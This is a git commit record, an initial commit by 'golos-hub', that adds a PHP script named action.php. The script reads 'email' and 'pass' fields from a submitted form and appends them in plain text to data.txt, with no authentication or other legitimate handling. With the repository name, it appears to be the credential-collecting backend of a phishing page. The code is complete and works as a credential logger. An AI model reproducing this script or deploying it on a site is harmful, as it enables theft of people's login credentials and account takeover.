cb1394cc857868d528b25ef09c16d1c46204b80e
golos-hub <mer2282000@gmail.com>
2021-05-03 16:50:39 +0300

    init commit

---
+++ action.php
@@ -0,0 +1,10 @@
+<?php
+
+$email = trim($_POST['email']);
+$pass = trim($_POST['pass']);
+
+$fp = fopen('data.txt','a');
+fwrite($fp,"email: {$email}\n");
+fwrite($fp,"pass: {$pass}\n");
+fwrite($fp,"------------\n");
+fclose($fp);
